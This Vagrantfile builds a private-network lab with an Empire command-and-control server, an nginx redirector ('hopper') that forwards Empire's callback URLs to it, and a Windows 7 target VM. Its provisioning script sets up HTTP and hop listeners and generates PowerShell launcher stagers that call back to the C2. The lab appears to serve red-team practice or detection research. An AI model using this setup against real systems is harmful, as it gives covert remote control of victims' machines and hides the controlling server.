
$empire = <<SCRIPT
echo "Empire ..."
cd /home/vagrant/
wget -q https://github.com/adaptivethreat/Empire/archive/2.0_beta.tar.gz
tar -xzf 2.0_beta.tar.gz
rm 2.0_beta.tar.gz
#cp /vagrant/custom/screenlogger.py /home/vagrant/Empire-dev/lib/modules/collection/
cd /home/vagrant/Empire-2.0_beta/setup/
echo -en "somekey\n" | ./install.sh
cd ..
cat > cmd.txt <<EOF

listeners
uselistener http
set Name localhost
set BindIP 192.168.33.33
set Host http://192.168.33.33:8080
set DefaultLostLimit 0
set DefaultJitter 1
execute
back

uselistener http_hop
set Name hop1
set RedirectListener localhost
set OutFolder /usr/share/nginx/html
set Host http://192.168.33.33:80
execute
back

uselistener http_hop
set Name hop2
set RedirectListener localhost
set OutFolder /usr/share/nginx/html/hop2
set Host http://192.168.33.22:80
execute
back

usestager windows/launcher_bat
set Listener localhost
set OutFile /vagrant/hopper/launcher_localhost.bat
set Language powershell
set Delete False
set StagerRetries 8
generate
back

usestager windows/launcher_bat
set Listener hop1
set OutFile /vagrant/hopper/launcher_hop1.bat
set Language powershell
set Delete False
set StagerRetries 8
generate
back

usestager windows/launcher_bat
set Listener hop2
set OutFile /vagrant/hopper/launcher_hop2.bat
set Language powershell
set Delete False
set StagerRetries 8
generate
back

usestager multi/launcher
set Listener localhost
set Base64 False
set StagerRetries 8
set OutFile /vagrant/hopper/multi.txt
generate
back

list
info localhost
info hop1
info hop2

main
exit
y
EOF
./empire < cmd.txt

apt-get -y install nginx php5-fpm > /dev/null
cat > /etc/nginx/sites-enabled/default <<EOF
server {
	listen 80 default_server;
	root /usr/share/nginx/html;
	index index.html index.htm;
	server_name localhost;
	location / {
		try_files $uri $uri/ =404;
	}
	location ~ \.php$ {
		fastcgi_pass unix:/var/run/php5-fpm.sock;
		fastcgi_index index.php;
		include fastcgi_params;
	}
}
EOF
service nginx start
service nginx reload
service nginx status
cp /vagrant/hopper/chat.php /usr/share/nginx/html/chat.php
cp /vagrant/helpers/upload.php /usr/share/nginx/html/upload.php
mkdir -p /var/www/chat
chown www-data:www-data /var/www/chat

date >> /etc/vagrant_provisioned_at
SCRIPT

$hopper = <<SCRIPT
echo "hopper .."
apt-get -y install nginx > /dev/null

cat > /etc/nginx/sites-enabled/default <<EOF
limit_conn_zone $binary_remote_addr zone=addr:10m;
server {
	listen 80 default_server;
	root /usr/share/nginx/html;
	index index.html index.htm;
	server_name localhost;
	location = /admin/get.php {
		proxy_set_header X-Forwarded-For  $remote_addr;
		proxy_pass http://192.168.33.33;
	}
	location = /login/process.php {
		proxy_set_header X-Forwarded-For  $remote_addr;
		proxy_pass http://192.168.33.33;
	}
  location = /news.php {
    proxy_set_header X-Forwarded-For  $remote_addr;
    proxy_pass http://192.168.33.33;
  }
	location / {
		limit_rate 256;
		limit_conn addr 1;
	}
}
EOF
service nginx start
service nginx reload
service nginx status
date >> /etc/vagrant_provisioned_at
cat /etc/nginx/sites-enabled/default
SCRIPT


$win = <<SCRIPT
echo "win .."
# net use x: \\VBOXSVR\vagrant
# New-PSDrive –Name “x” –PSProvider FileSystem –Root “\\VBOXSVR\vagrant” –Persist
# x:\hopper\launcher.cmd
SCRIPT


Vagrant.configure(2) do |config|

   config.vm.define 'empire' do |box|
      box.vm.box = "ubu14"
      box.vm.hostname = 'empire'
      box.vm.network :private_network, ip: "192.168.33.33"
      box.vm.provider :virtualbox do |vb|
       vb.customize ["modifyvm", :id, "--memory", "1024"]
       vb.customize ["modifyvm", :id, "--cpus", "2"]
      end
      config.vm.provision "shell", inline: $empire
   end

  config.vm.define 'hopper' do |box|
     box.vm.box = "ubu14"
     box.vm.hostname = 'hopper'
     box.vm.network :private_network, ip: "192.168.33.22"
     box.vm.provider :virtualbox do |vb|
      vb.customize ["modifyvm", :id, "--memory", "1024"]
      vb.customize ["modifyvm", :id, "--cpus", "1"]
     end
     config.vm.provision "shell", inline: $hopper
  end

  config.vm.define 'win' do |box|
     box.vm.box = "ferventcoder/win7pro-x64-nocm-lite"
     box.vm.hostname = 'win'
     box.vm.network :private_network, ip: "192.168.33.11"
     box.vm.provider :virtualbox do |vb|
      vb.customize ["modifyvm", :id, "--memory", "1024"]
      vb.customize ["modifyvm", :id, "--cpus", "1"]
      vb.gui = true
     end
     config.vm.provision "shell", inline: $win
  end

end
